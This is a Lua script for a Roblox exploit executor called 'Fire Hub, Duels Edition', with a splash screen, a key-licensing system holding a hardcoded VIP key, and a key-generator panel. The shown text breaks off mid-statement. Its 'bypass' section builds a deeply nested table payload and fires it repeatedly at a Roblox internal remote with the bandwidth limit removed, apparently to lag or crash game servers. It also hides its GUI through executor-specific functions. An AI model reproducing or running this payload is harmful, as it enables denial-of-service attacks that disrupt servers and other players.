-- ===================== FIRE HUB - STARTUP SPLASH =====================
do
	local Players = game:GetService("Players")
	local LP2 = Players.LocalPlayer
	local TweenService2 = game:GetService("TweenService")
	local SoundService2 = game:GetService("SoundService")

	local splashGui = Instance.new("ScreenGui")
	splashGui.Name = "FireHubSplash"
	splashGui.ResetOnSpawn = false
	splashGui.DisplayOrder = 999
	splashGui.IgnoreGuiInset = true
	if not pcall(function() splashGui.Parent = game:GetService("CoreGui") end) then
		splashGui.Parent = LP2:WaitForChild("PlayerGui")
	end

	local overlay = Instance.new("Frame", splashGui)
	overlay.Size = UDim2.new(1,0,1,0)
	overlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
	overlay.BackgroundTransparency = 0
	overlay.BorderSizePixel = 0
	overlay.ZIndex = 1

	local tapHint = Instance.new("TextLabel", splashGui)
	tapHint.Size = UDim2.new(1, 0, 0, 20)
	tapHint.Position = UDim2.new(0, 0, 1, -36)
	tapHint.BackgroundTransparency = 1
	tapHint.Text = "tap anywhere to skip"
	tapHint.TextColor3 = Color3.fromRGB(80, 110, 160)
	tapHint.Font = Enum.Font.Gotham
	tapHint.TextSize = 11
	tapHint.ZIndex = 10
	tapHint.TextXAlignment = Enum.TextXAlignment.Center

	local skipZone = Instance.new("TextButton", splashGui)
	skipZone.Size = UDim2.new(1,0,1,0)
	skipZone.BackgroundTransparency = 1
	skipZone.Text = ""
	skipZone.ZIndex = 9

	local container = Instance.new("Frame", splashGui)
	container.Size = UDim2.new(0,320,0,120)
	container.Position = UDim2.new(0.5,-160,0,-140)
	container.BackgroundTransparency = 1
	container.BorderSizePixel = 0
	container.ZIndex = 2
	container.ClipsDescendants = false

	local titleSplash = Instance.new("TextLabel", container)
	titleSplash.Size = UDim2.new(1,0,0,70)
	titleSplash.Position = UDim2.new(0,0,0,0)
	titleSplash.BackgroundTransparency = 1
	titleSplash.Text = "FIRE HUB"
	titleSplash.TextColor3 = Color3.fromRGB(255,255,255)
	titleSplash.Font = Enum.Font.GothamBlack
	titleSplash.TextSize = 48
	titleSplash.TextTransparency = 0
	titleSplash.ZIndex = 3
	do
		local g = Instance.new("UIGradient", titleSplash)
		g.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(0,140,255)),
			ColorSequenceKeypoint.new(0.5, Color3.fromRGB(180,220,255)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(80,100,255))
		})
	end

	local subSplash = Instance.new("TextLabel", container)
	subSplash.Size = UDim2.new(1,0,0,24)
	subSplash.Position = UDim2.new(0,0,0,72)
	subSplash.BackgroundTransparency = 1
	subSplash.Text = "Duels Edition"
	subSplash.TextColor3 = Color3.fromRGB(100,140,200)
	subSplash.Font = Enum.Font.Gotham
	subSplash.TextSize = 13
	subSplash.TextTransparency = 0
	subSplash.ZIndex = 3

	local fragments = {}
	local fragTexts = {"FI","RE"," H","UB"}
	local fragColors = {
		Color3.fromRGB(0,140,255),
		Color3.fromRGB(80,160,255),
		Color3.fromRGB(180,220,255),
		Color3.fromRGB(100,120,255),
	}
	for i, txt in ipairs(fragTexts) do
		local frag = Instance.new("TextLabel", splashGui)
		frag.Size = UDim2.new(0,90,0,60)
		frag.AnchorPoint = Vector2.new(0.5,0.5)
		frag.Position = UDim2.new(0.5, (i-2.5)*70, 0.5, -30)
		frag.BackgroundTransparency = 1
		frag.Text = txt
		frag.TextColor3 = fragColors[i]
		frag.Font = Enum.Font.GothamBlack
		frag.TextSize = 44
		frag.TextTransparency = 1
		frag.ZIndex = 5
		table.insert(fragments, frag)
	end

	local function playSound(id, pitch, vol, parent, delay)
		task.delay(delay or 0, function()
			local s = Instance.new("Sound")
			s.SoundId = id
			s.PlaybackSpeed = pitch
			s.Volume = vol
			s.Parent = parent
			s.RollOffMaxDistance = 0
			s:Play()
			game:GetService("Debris"):AddItem(s, 3)
		end)
	end

	local function playGlitchImpact()
		playSound("rbxassetid://1588058260", 1.0, 0.9, SoundService2, 0)
		playSound("rbxassetid://8627516764", 0.8, 0.7, SoundService2, 0.02)
		playSound("rbxassetid://1588058260", 1.4, 0.5, SoundService2, 0.05)
		playSound("rbxassetid://8627516764", 1.2, 0.4, SoundService2, 0.1)
	end

	local function playWhistle()
		local WHISTLE_ID = "rbxassetid://4612414100"
		playSound(WHISTLE_ID, 2.2, 0.7, SoundService2, 0)
		playSound(WHISTLE_ID, 1.7, 0.8, SoundService2, 0.07)
		playSound(WHISTLE_ID, 1.2, 0.9, SoundService2, 0.15)
		playSound(WHISTLE_ID, 0.85, 0.9, SoundService2, 0.24)
		playSound(WHISTLE_ID, 0.55, 0.7, SoundService2, 0.34)
		playSound(WHISTLE_ID, 0.3, 1.0, SoundService2, 0.5)
	end

	local function doShatterEffect()
		pcall(playGlitchImpact)
		local flash = Instance.new("Frame", splashGui)
		flash.Size = UDim2.new(1,0,1,0)
		flash.BackgroundColor3 = Color3.fromRGB(255,255,255)
		flash.BackgroundTransparency = 0.3
		flash.BorderSizePixel = 0
		flash.ZIndex = 8
		TweenService2:Create(flash, TweenInfo.new(0.18), {BackgroundTransparency=1}):Play()
		game:GetService("Debris"):AddItem(flash, 0.3)
		titleSplash.TextTransparency = 1
		local RunService2 = game:GetService("RunService")
		for i, frag in ipairs(fragments) do
			frag.TextTransparency = 0
			local dirX = (i - 2.5) * 70 + math.random(-80, 80)
			local dirY = math.random(120, 280)
			local rot = math.random(-180, 180)
			local startPosX = frag.Position.X.Offset
			local startPosY = frag.Position.Y.Offset
			local t = 0
			local conn
			conn = RunService2.RenderStepped:Connect(function(dt)
				t = t + dt
				if t > 0.8 then frag.TextTransparency = 1; conn:Disconnect(); return end
				local alpha = t / 0.8
				local px = startPosX + dirX * alpha
				local py = startPosY - dirY * alpha + 300 * alpha * alpha
				local fade = math.clamp(alpha * 1.4 - 0.3, 0, 1)
				frag.Position = UDim2.new(0.5, px, 0.5, py - 30)
				frag.Rotation = rot * alpha
				frag.TextTransparency = fade
				frag.TextSize = math.clamp(44 - alpha * 20, 10, 44)
			end)
		end
		for li = 1, 8 do
			task.delay(li * 0.025, function()
				local line = Instance.new("Frame", splashGui)
				line.Size = UDim2.new(1, 0, 0, math.random(2,6))
				line.Position = UDim2.new(0, 0, math.random(), 0)
				line.BackgroundColor3 = Color3.fromRGB(math.random(60,255), math.random(0,100), math.random(150,255))
				line.BackgroundTransparency = math.random() * 0.3
				line.BorderSizePixel = 0
				line.ZIndex = 7
				TweenService2:Create(line, TweenInfo.new(0.12), {BackgroundTransparency=1}):Play()
				game:GetService("Debris"):AddItem(line, 0.2)
			end)
		end
	end

	local splashDone = false
	local function finishSplash()
		if splashDone then return end
		splashDone = true
		TweenService2:Create(subSplash, TweenInfo.new(0.3), {TextTransparency=1}):Play()
		TweenService2:Create(overlay, TweenInfo.new(0.4), {BackgroundTransparency=1}):Play()
		tapHint.Visible = false
	end

	skipZone.MouseButton1Click:Connect(function()
		titleSplash.TextTransparency = 1
		subSplash.TextTransparency = 1
		finishSplash()
	end)

	task.spawn(function()
		TweenService2:Create(overlay, TweenInfo.new(0.2), {BackgroundTransparency=0.1}):Play()
		task.wait(0.15)
		pcall(playWhistle)
		TweenService2:Create(container, TweenInfo.new(0.45, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out),
			{Position=UDim2.new(0.5,-160,0.5,-60)}):Play()
		task.wait(0.5)
		doShatterEffect()
		task.wait(0.85)
		finishSplash()
		task.wait(0.45)
		if splashGui and splashGui.Parent then splashGui:Destroy() end
	end)

	local _t0 = tick()
	while not splashDone and (tick() - _t0) < 3.0 do
		task.wait(0.05)
	end
end

-- ===================== FIRE HUB MAIN SCRIPT =====================
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local NetworkClient = game:GetService("NetworkClient")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()

local BACKGROUND_IMAGES = {
	"rbxassetid://118430925194305",
	"rbxassetid://72861082408515",
	"rbxassetid://111960353660490",
}

local DEFAULT_POWER = 97000
local DEFAULT_KEY = Enum.KeyCode.F
local SIZE_MIN, SIZE_MAX = 0.7, 1.5
local TRACK_W, KNOB_S = 230, 14
local RADIUS = 13

local VIP_KEY = "betxnvip2021"

local C = {
	panel   = Color3.fromRGB(16, 16, 16),
	border  = Color3.fromRGB(40, 40, 40),
	outline = Color3.fromRGB(70, 70, 70),
	graybg  = Color3.fromRGB(45, 45, 45),
	white   = Color3.fromRGB(255, 255, 255),
	blue    = Color3.fromRGB(0, 140, 255),
	black   = Color3.fromRGB(0, 0, 0),
	gray    = Color3.fromRGB(150, 150, 150),
	dim     = Color3.fromRGB(115, 115, 115),
	green   = Color3.fromRGB(0, 200, 100),
	red     = Color3.fromRGB(255, 60, 60),
}

-- ═══════════ KEY SYSTEM (Self-contained + Session) ═══════════
local KEYS_FILE = "FireHub_Keys.json"
local SESSION_FILE = "FireHub_Session.txt"
local BLACKLIST_FILE = "FireHub_Blacklist.json"
local ActiveKeys = {}      -- solo para el panel del VIP
local Blacklist = {}       -- keys que el VIP ha invalidado manualmente

-- Simple encode/decode para meter la fecha dentro de la key
local function simpleEncode(str)
	local result = {}
	for i = 1, #str do
		local c = string.byte(str, i)
		table.insert(result, string.format("%02X", bit32.bxor(c, 67)))
	end
	return table.concat(result)
end

local function simpleDecode(hex)
	local result = {}
	for i = 1, #hex, 2 do
		local byte = tonumber(hex:sub(i, i+1), 16)
		if not byte then return nil end
		table.insert(result, string.char(bit32.bxor(byte, 67)))
	end
	return table.concat(result)
end

local function saveKeys()
	if writefile then
		local ok, data = pcall(function() return HttpService:JSONEncode(ActiveKeys) end)
		if ok then pcall(writefile, KEYS_FILE, data) end
	end
end

local function loadKeys()
	if isfile and isfile(KEYS_FILE) and readfile then
		local ok, data = pcall(function() return HttpService:JSONDecode(readfile(KEYS_FILE)) end)
		if ok and type(data) == "table" then ActiveKeys = data end
	end
end

local function saveBlacklist()
	if writefile then
		local ok, data = pcall(function() return HttpService:JSONEncode(Blacklist) end)
		if ok then pcall(writefile, BLACKLIST_FILE, data) end
	end
end

local function loadBlacklist()
	if isfile and isfile(BLACKLIST_FILE) and readfile then
		local ok, data = pcall(function() return HttpService:JSONDecode(readfile(BLACKLIST_FILE)) end)
		if ok and type(data) == "table" then Blacklist = data end
	end
end

local function saveSession(key)
	if writefile then pcall(writefile, SESSION_FILE, tostring(key)) end
end

local function loadSession()
	if isfile and isfile(SESSION_FILE) and readfile then
		local ok, data = pcall(readfile, SESSION_FILE)
		if ok and data and data ~= "" then
			return tostring(data):gsub("%s+", "")
		end
	end
	return nil
end

local function clearSession()
	if delfile and isfile and isfile(SESSION_FILE) then
		pcall(delfile, SESSION_FILE)
	elseif writefile then
		pcall(writefile, SESSION_FILE, "")
	end
end

local function generateRandomPart()
	local chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
	local key = ""
	for i = 1, 8 do
		key = key .. chars:sub(math.random(1, #chars), math.random(1, #chars))
	end
	return key
end

-- Crea una key que lleva la fecha de vencimiento DENTRO
local function createKey(days)
	local random = generateRandomPart()
	local expiry = (days == -1) and 0 or (os.time() + days * 86400) -- 0 = permanente
	local raw = random .. "|" .. tostring(expiry)
	local encoded = simpleEncode(raw)
	local finalKey = "FH-" .. encoded

	-- Guardamos también en la lista del VIP para el panel
	ActiveKeys[finalKey] = {
		expiry = (expiry == 0) and math.huge or expiry,
		created = os.time(),
		days = days
	}
	saveKeys()
	return finalKey
end

local function expireKey(key)
	ActiveKeys[key] = nil
	Blacklist[key] = true          -- la metemos en blacklist
	saveKeys()
	saveBlacklist()
end

local function expireAllKeys()
	for key, _ in pairs(ActiveKeys) do
		Blacklist[key] = true
	end
	ActiveKeys = {}
	saveKeys()
	saveBlacklist()
end

local function formatTimeLeft(expiry)
	if expiry == math.huge or expiry == 0 then
		return "PERMANENT"
	end
	local left = expiry - os.time()
	if left <= 0 then return "EXPIRED" end
	local days = math.floor(left / 86400)
	local hours = math.floor((left % 86400) / 3600)
	local mins = math.floor((left % 3600) / 60)
	if days > 0 then
		return days .. "d " .. hours .. "h left"
	elseif hours > 0 then
		return hours .. "h " .. mins .. "m left"
	else
		return mins .. "m left"
	end
end

-- Validación que funciona en CUALQUIER PC (la fecha va dentro de la key)
local function isKeyValid(key)
	if key == VIP_KEY then return true, "vip" end

	-- Si está en blacklist (solo afecta al que tiene el archivo, pero lo intentamos)
	if Blacklist[key] then return false end

	if not key:match("^FH%-") then return false end

	local encoded = key:sub(4)
	local decoded = simpleDecode(encoded)
	if not decoded then return false end

	local random, expiryStr = decoded:match("^([^|]+)|(.+)$")
	if not random or not expiryStr then return false end

	local expiry = tonumber(expiryStr)
	if not expiry then return false end

	if expiry == 0 then
		return true, "normal" -- permanente
	end

	if os.time() > expiry then
		return false -- vencida
	end

	return true, "normal"
end

local function copyToClipboard(text)
	if setclipboard then
		setclipboard(text)
		return true
	end
	return false
end

loadKeys()
loadBlacklist()

-- ═══════════ LOGIQUE BYPASS ═══════════
local DEPTH = 296
local spamThread = nil
local bomb = nil
local running = false
local SPAM_DELAY = 0.12

local function buildBomb(power)
	local maintable = {}
	local spammedtable = {}
	table.insert(spammedtable, {})
	local z = spammedtable[1]
	for i = 1, DEPTH do
		local tableins = {}
		table.insert(z, tableins)
		z = tableins
	end
	local maxRep = math.floor(power / (DEPTH + 2))
	for i = 1, maxRep do
		table.insert(maintable, spammedtable)
	end
	return maintable
end

local function restartSpamLoop(power)
	if spamThread then pcall(task.cancel, spamThread) end
	bomb = buildBomb(power)
	spamThread = task.spawn(function()
		while running do
			if bomb then
				pcall(function()
					game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
				end)
			end
			task.wait(SPAM_DELAY)
		end
	end)
end

local function onBypassToggle(state, power)
	running = state
	pcall(function()
		NetworkClient:SetOutgoingKBPSLimit(state and math.huge or 0)
	end)
	if state then
		restartSpamLoop(power)
	else
		if spamThread then pcall(task.cancel, spamThread) end
		spamThread = nil
		bomb = nil
	end
end

local function stopSpamLoop()
	running = false
	if spamThread then pcall(task.cancel, spamThread) end
	spamThread = nil
	bomb = nil
end

-- ═══════════════ HELPERS ═══════════════
local function new(class, props, parent)
	local obj = Instance.new(class)
	for k, v in pairs(props or {}) do obj[k] = v end
	obj.Parent = parent
	return obj
end
local function corner(obj, r)
	return new("UICorner", {CornerRadius = UDim.new(0, r)}, obj)
end
local function stroke(obj, color, thickness)
	return new("UIStroke", {Color = color, Thickness = thickness or 1, ApplyStrokeMode = Enum.ApplyStrokeMode.Border}, obj)
end
local function normalizeId(id)
	if type(id) == "number" then return "rbxassetid://" .. id end
	if string.find(id, "rbxassetid://") then return id end
	return "rbxassetid://" .. id
end
local function getGuiParent()
	if typeof(gethui) == "function" then
		local ok, res = pcall(gethui)
		if ok and res then return res end
	end
	local ok, coreGui = pcall(function() return game:GetService("CoreGui") end)
	if ok and coreGui then return coreGui end
	return LocalPlayer:WaitForChild("PlayerGui")
end

local parent = getGuiParent()
local oldGui = parent:FindFirstChild("FireHubGui")
if oldGui then oldGui:Destroy() end

local gui = new("ScreenGui", {
	Name = "FireHubGui",
	ResetOnSpawn = false,
	IgnoreGuiInset = true,
	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
}, nil)
if type(syn) == "table" and type(syn.protect_gui) == "function" then
	pcall(syn.protect_gui, gui)
elseif typeof(protectgui) == "function" then
	pcall(protectgui, gui)
end
pcall(function() gui.Parent = parent end)
if not gui.Parent then gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

-- ═══════════════ DRAG SYSTEM ═══════════════
local function makeDraggable(frame, handle)
	handle = handle or frame
	local dragging = false
	local dragStart, startPos

	handle.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local delta = input.Position - dragStart
			frame.Position = UDim2.new(
				startPos.X.Scale, startPos.X.Offset + delta.X,
				startPos.Y.Scale, startPos.Y.Offset + delta.Y
			)
		end
	end)

	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end)
end

-- ═══════════════ KEY INPUT UI ═══════════════
local keyFrame = new("Frame", {
	Size = UDim2.fromOffset(280, 180),
	Position = UDim2.new(0.5, -140, 0.5, -90),
	BackgroundColor3 = C.panel,
	BorderSizePixel = 0,
	Active = true,
}, gui)
corner(keyFrame, 14)
stroke(keyFrame, C.border, 1.5)

new("TextLabel", {
	Size = UDim2.new(1, 0, 0, 30),
	Position = UDim2.fromOffset(0, 12),
	BackgroundTransparency = 1,
	Text = "FIRE HUB",
	TextColor3 = C.blue,
	Font = Enum.Font.GothamBold,
	TextSize = 18,
}, keyFrame)

new("TextLabel", {
	Size = UDim2.new(1, 0, 0, 18),
	Position = UDim2.fromOffset(0, 40),
	BackgroundTransparency = 1,
	Text = "Enter your key",
	TextColor3 = C.gray,
	Font = Enum.Font.Gotham,
	TextSize = 12,
}, keyFrame)

local keyBox = new("TextBox", {
	Size = UDim2.fromOffset(240, 36),
	Position = UDim2.fromOffset(20, 70),
	BackgroundColor3 = C.graybg,
	BorderSizePixel = 0,
	Text = "",
	PlaceholderText = "Key here...",
	TextColor3 = C.white,
	PlaceholderColor3 = C.dim,
	Font = Enum.Font.Gotham,
	TextSize = 14,
	ClearTextOnFocus = false,
}, keyFrame)
corner(keyBox, 8)

local keyStatus = new("TextLabel", {
	Size = UDim2.new(1, 0, 0, 16),
	Position = UDim2.fromOffset(0, 112),
	BackgroundTransparency = 1,
	Text = "",
	TextColor3 = C.red,
	Font = Enum.Font.Gotham,
	TextSize = 11,
}, keyFrame)

local submitKey = new("TextButton", {
	Size = UDim2.fromOffset(240, 34),
	Position = UDim2.fromOffset(20, 132),
	BackgroundColor3 = C.blue,
	BorderSizePixel = 0,
	Text = "UNLOCK",
	TextColor3 = C.black,
	Font = Enum.Font.GothamBold,
	TextSize = 13,
	AutoButtonColor = false,
}, keyFrame)
corner(submitKey, 8)

makeDraggable(keyFrame)

-- ═══════════════ CREATOR PANEL ═══════════════
local creatorFrame = new("Frame", {
	Size = UDim2.fromOffset(320, 490),
	Position = UDim2.new(0.5, -160, 0.5, -245),
	BackgroundColor3 = C.panel,
	BorderSizePixel = 0,
	Visible = false,
	Active = true,
}, gui)
corner(creatorFrame, 14)
stroke(creatorFrame, C.border, 1.5)

local creatorHeader = new("Frame", {
	Size = UDim2.new(1, 0, 0, 40),
	BackgroundTransparency = 1,
}, creatorFrame)

new("TextLabel", {
	Size = UDim2.new(1, 0, 0, 28),
	Position = UDim2.fromOffset(0, 10),
	BackgroundTransparency = 1,
	Text = "BYPASS CREATOR KEYS",
	TextColor3 = C.blue,
	Font = Enum.Font.GothamBold,
	TextSize = 15,
}, creatorFrame)

new("TextLabel", {
	Size = UDim2.new(1, 0, 0, 16),
	Position = UDim2.fromOffset(0, 36),
	BackgroundTransparency = 1,
	Text = "Generate keys for users",
	TextColor3 = C.gray,
	Font = Enum.Font.Gotham,
	TextSize = 11,
}, creatorFrame)

local function makeDurBtn(text, x, y, callback)
	local b = new("TextButton", {
		Size = UDim2.fromOffset(70, 28),
		Position = UDim2.fromOffset(x, y),
		BackgroundColor3 = C.graybg,
		BorderSizePixel = 0,
		Text = text,
		TextColor3 = C.white,
		Font = Enum.Font.GothamBold,
		TextSize = 11,
		AutoButtonColor = false,
	}, creatorFrame)
	corner(b, 6)
	b.Activated:Connect(callback)
	return b
end

local lastGenerated = new("TextLabel", {
	Size = UDim2.fromOffset(200, 22),
	Position = UDim2.fromOffset(20, 145),
	BackgroundTransparency = 1,
	Text = "Last key: none",
	TextColor3 = C.green,
	Font = Enum.Font.Gotham,
	TextSize = 11,
	TextXAlignment = Enum.TextXAlignment.Left,
}, creatorFrame)

local lastKeyValue = ""

local copyLastBtn = new("TextButton", {
	Size = UDim2.fromOffset(70, 24),
	Position = UDim2.fromOffset(230, 144),
	BackgroundColor3 = C.blue,
	BorderSizePixel = 0,
	Text = "COPY",
	TextColor3 = C.black,
	Font = Enum.Font.GothamBold,
	TextSize = 11,
	AutoButtonColor = false,
	Visible = false,
}, creatorFrame)
corner(copyLastBtn, 6)

copyLastBtn.Activated:Connect(function()
	if lastKeyValue ~= "" then
		if copyToClipboard(lastKeyValue) then
			copyLastBtn.Text = "COPIED!"
			task.delay(1.2, function()
				if copyLastBtn then copyLastBtn.Text = "COPY" end
			end)
		end
	end
end)

makeDurBtn("PERMA", 20, 70, function()
	local k = createKey(-1)
	lastKeyValue = k
	lastGenerated.Text = "Last key: " .. k
	lastGenerated.TextColor3 = C.green
	copyLastBtn.Visible = true
	refreshKeyList()
end)

makeDurBtn("7 DAYS", 100, 70, function()
	local k = createKey(7)
	lastKeyValue = k
	lastGenerated.Text = "Last key: " .. k
	lastGenerated.TextColor3 = C.green
	copyLastBtn.Visible = true
	refreshKeyList()
end)

makeDurBtn("5 DAYS", 180, 70, function()
	local k = createKey(5)
	lastKeyValue = k
	lastGenerated.Text = "Last key: " .. k
	lastGenerated.TextColor3 = C.green
	copyLastBtn.Visible = true
	refreshKeyList()
end)

local customDaysBox = new("TextBox", {
	Size = UDim2.fromOffset(80, 28),
	Position = UDim2.fromOffset(20, 108),
	BackgroundColor3 = C.graybg,
	BorderSizePixel = 0,
	Text = "5",
	PlaceholderText = "Days",
	TextColor3 = C.white,
	Font = Enum.Font.Gotham,
	TextSize = 12,
}, creatorFrame)
corner(customDaysBox, 6)

local createCustomBtn = new("TextButton", {
	Size = UDim2.fromOffset(110, 28),
	Position = UDim2.fromOffset(110, 108),
	BackgroundColor3 = C.blue,
	BorderSizePixel = 0,
	Text = "CREATE CUSTOM",
	TextColor3 = C.black,
	Font = Enum.Font.GothamBold,
	TextSize = 11,
	AutoButtonColor = false,
}, creatorFrame)
corner(createCustomBtn, 6)

createCustomBtn.Activated:Connect(function()
	local days = tonumber(customDaysBox.Text)
	if not days or days < 1 then
		lastGenerated.Text = "Invalid days number"
		lastGenerated.TextColor3 = C.red
		copyLastBtn.Visible = false
		return
	end
	local k = createKey(days)
	lastKeyValue = k
	lastGenerated.Text = "Last key: " .. k
	lastGenerated.TextColor3 = C.green
	copyLastBtn.Visible = true
	refreshKeyList()
end)

new("TextLabel", {
	Size = UDim2.fromOffset(200, 16),
	Position = UDim2.fromOffset(20, 175),
	BackgroundTransparency = 1,
	Text = "ACTIVE KEYS",
	TextColor3 = C.gray,
	Font = Enum.Font.GothamBold,
	TextSize = 11,
	TextXAlignment = Enum.TextXAlignment.Left,
}, creatorFrame)

local scroll = new("ScrollingFrame", {
	Size = UDim2.fromOffset(280, 220),
	Position = UDim2.fromOffset(20, 195),
	BackgroundColor3 = C.graybg,
	BorderSizePixel = 0,
	ScrollBarThickness = 4,
	CanvasSize = UDim2.fromOffset(0, 0),
}, creatorFrame)
corner(scroll, 8)

local listLayout = new("UIListLayout", {
	Padding = UDim.new(0, 8),
	SortOrder = Enum.SortOrder.LayoutOrder,
}, scroll)

function refreshKeyList()
	for _, child in ipairs(scroll:GetChildren()) do
		if child:IsA("Frame") then child:Destroy() end
	end

	local count = 0
	for key, info in pairs(ActiveKeys) do
		count = count + 1

		local row = new("Frame", {
			Size = UDim2.new(1, -12, 0, 56),
			BackgroundColor3 = C.panel,
			BorderSizePixel = 0,
			LayoutOrder = count,
		}, scroll)
		corner(row, 8)

		new("TextLabel", {
			Size = UDim2.fromOffset(175, 22),
			Position = UDim2.fromOffset(10, 6),
			BackgroundTransparency = 1,
			Text = key,
			TextColor3 = C.white,
			Font = Enum.Font.GothamBold,
			TextSize = 12,
			TextXAlignment = Enum.TextXAlignment.Left,
			TextTruncate = Enum.TextTruncate.AtEnd,
		}, row)

		local timeText = formatTimeLeft(info.expiry)
		local timeColor = C.green
		if timeText == "EXPIRED" then timeColor = C.red
		elseif timeText == "PERMANENT" then timeColor = C.blue end

		new("TextLabel", {
			Size = UDim2.fromOffset(175, 18),
			Position = UDim2.fromOffset(10, 30),
			BackgroundTransparency = 1,
			Text = timeText,
			TextColor3 = timeColor,
			Font = Enum.Font.Gotham,
			TextSize = 12,
			TextXAlignment = Enum.TextXAlignment.Left,
		}, row)

		local copyBtn = new("TextButton", {
			Size = UDim2.fromOffset(50, 24),
			Position = UDim2.fromOffset(185, 16),
			BackgroundColor3 = C.blue,
			BorderSizePixel = 0,
			Text = "COPY",
			TextColor3 = C.black,
			Font = Enum.Font.GothamBold,
			TextSize = 10,
			AutoButtonColor = false,
		}, row)
		corner(copyBtn, 6)

		copyBtn.Activated:Connect(function()
			if copyToClipboard(key) then
				copyBtn.Text = "OK"
				task.delay(1, function() if copyBtn then copyBtn.Text = "COPY" end end)
			end
		end)

		local arrowBtn = new("TextButton", {
			Size = UDim2.fromOffset(28, 28),
			Position = UDim2.fromOffset(240, 14),
			BackgroundColor3 = Color3.fromRGB(30, 30, 30),
			BorderSizePixel = 0,
			Text = "→",
			TextColor3 = C.blue,
			Font = Enum.Font.GothamBold,
			TextSize = 16,
			AutoButtonColor = false,
		}, row)
		corner(arrowBtn, 6)

		arrowBtn.Activated:Connect(function()
			expireKey(key)
			refreshKeyList()
		end)
	end

	scroll.CanvasSize = UDim2.fromOffset(0, count * 64)
end

-- Botón EXPIRE ALL
local expireAllBtn = new("TextButton", {
	Size = UDim2.fromOffset(130, 26),
	Position = UDim2.fromOffset(20, 425),
	BackgroundColor3 = C.red,
	BorderSizePixel = 0,
	Text = "EXPIRE ALL KEYS",
	TextColor3 = C.white,
	Font = Enum.Font.GothamBold,
	TextSize = 11,
	AutoButtonColor = false,
}, creatorFrame)
corner(expireAllBtn, 6)

expireAllBtn.Activated:Connect(function()
	expireAllKeys()
	refreshKeyList()
	lastGenerated.Text = "All keys expired!"
	lastGenerated.TextColor3 = C.red
	copyLastBtn.Visible = false
end)

local logoutCreator = new("TextButton", {
	Size = UDim2.fromOffset(70, 26),
	Position = UDim2.fromOffset(160, 425),
	BackgroundColor3 = Color3.fromRGB(60, 60, 60),
	BorderSizePixel = 0,
	Text = "LOGOUT",
	TextColor3 = C.white,
	Font = Enum.Font.GothamBold,
	TextSize = 11,
	AutoButtonColor = false,
}, creatorFrame)
corner(logoutCreator, 6)

local closeCreator = new("TextButton", {
	Size = UDim2.fromOffset(28, 28),
	Position = UDim2.new(1, -36, 0, 8),
	BackgroundTransparency = 1,
	Text = "×",
	TextColor3 = C.gray,
	Font = Enum.Font.GothamBold,
	TextSize = 18,
}, creatorFrame)
closeCreator.Activated:Connect(function()
	creatorFrame.Visible = false
	keyFrame.Visible = true
end)

makeDraggable(creatorFrame, creatorHeader)

-- ═══════════════ MAIN BYPASS GUI ═══════════════
local main = new("Frame", {
	Name = "MainFrame",
	Size = UDim2.fromOffset(250, 404),
	Position = UDim2.new(0.5, -125, 0.5, -202),
	BackgroundTransparency = 1,
	BorderSizePixel = 0,
	ClipsDescendants = true,
	Active = true,
	Visible = false,
}, gui)
corner(main, RADIUS)
stroke(main, Color3.fromRGB(38, 38, 38), 1.2)
local uiScale = new("UIScale", {Scale = 1}, main)

local mainBg = new("ImageLabel", {
	Size = UDim2.new(1, 0, 1, 0),
	BackgroundTransparency = 1,
	Image = normalizeId(BACKGROUND_IMAGES[3]),
	ScaleType = Enum.ScaleType.Crop,
	ImageTransparency = 0,
	ZIndex = 0,
}, main)
corner(mainBg, RADIUS)

local logo = new("Frame", {
	Size = UDim2.fromOffset(38, 38), Position = UDim2.fromOffset(6, 4),
	BackgroundColor3 = C.blue, BorderSizePixel = 0, ZIndex = 2,
}, main)
corner(logo, 19)
new("TextLabel", {
	Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1,
	Text = "F", TextColor3 = C.black, Font = Enum.Font.GothamBlack, TextSize = 24,
	TextXAlignment = Enum.TextXAlignment.Center, TextYAlignment = Enum.TextYAlignment.Center,
}, logo)
new("TextLabel", {
	Size = UDim2.fromOffset(150, 15), Position = UDim2.fromOffset(50, 8),
	BackgroundTransparency = 1, Text = "FIRE HUB", TextColor3 = C.blue,
	Font = Enum.Font.GothamBold, TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
}, main)
new("TextLabel", {
	Size = UDim2.fromOffset(150, 13), Position = UDim2.fromOffset(50, 24),
	BackgroundTransparency = 1, Text = "discord.gg/karMRBX9Q", TextColor3 = C.blue,
	Font = Enum.Font.GothamMedium, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
}, main)

local minButton = new("TextButton", {
	Size = UDim2.fromOffset(18, 16), Position = UDim2.fromOffset(198, 12),
	BackgroundTransparency = 1, AutoButtonColor = false, Text = "-",
	TextColor3 = C.gray, Font = Enum.Font.GothamBold, TextSize = 15,
}, main)
local closeButton = new("TextButton", {
	Size = UDim2.fromOffset(18, 16), Position = UDim2.fromOffset(222, 12),
	BackgroundTransparency = 1, AutoButtonColor = false, Text = "×",
	TextColor3 = C.gray, Font = Enum.Font.GothamBold, TextSize = 13,
}, main)
local header = new("Frame", {
	Size = UDim2.new(1, 0, 0, 44), BackgroundTransparency = 1, ZIndex = 1,
}, main)

local logoutMain = new("TextButton", {
	Size = UDim2.fromOffset(60, 18),
	Position = UDim2.fromOffset(185, 28),
	BackgroundTransparency = 1,
	Text = "Logout",
	TextColor3 = C.dim,
	Font = Enum.Font.Gotham,
	TextSize = 10,
	AutoButtonColor = false,
}, main)

local tabsFrame = new("Frame", {
